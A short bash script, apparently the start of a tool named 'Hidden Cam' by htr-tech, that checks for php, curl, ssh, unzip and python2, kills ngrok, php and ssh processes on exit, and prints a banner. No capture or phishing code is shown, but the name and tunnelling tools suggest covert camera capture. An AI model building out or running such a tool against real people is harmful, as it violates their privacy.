#!/bin/bash

trap 'printf "\n";stop' 2
req() {

command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
command -v python2 > /dev/null 2>&1 || { echo >&2 "Python2 is not installed ! Install it"; exit 1; }

}
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
banner() {

clear
printf "  _    _ _     _     _               _____                 \e[0m\n"
printf " | |  | (_)   | |   | |             / ____|                \e[0m\n"
printf " | |__| |_  __| | __| | ___ _ __   | |     __ _ _ __ ___   \e[0m\n"
printf " |  __  | |/ _  |/ _  |/ _ \  _ \  | |    / _  |  _   _ \  \e[0m\n"
printf " | |  | | | (_| | (_| |  __/ | | | | |___| (_| | | | | | | \e[0m\n"
printf " |_|  |_|_|\__,_|\__,_|\___|_| |_|  \_____\__,_|_| |_| |_| \e[0m\n"
printf " \n"
printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
printf " \n"

}

banner
req
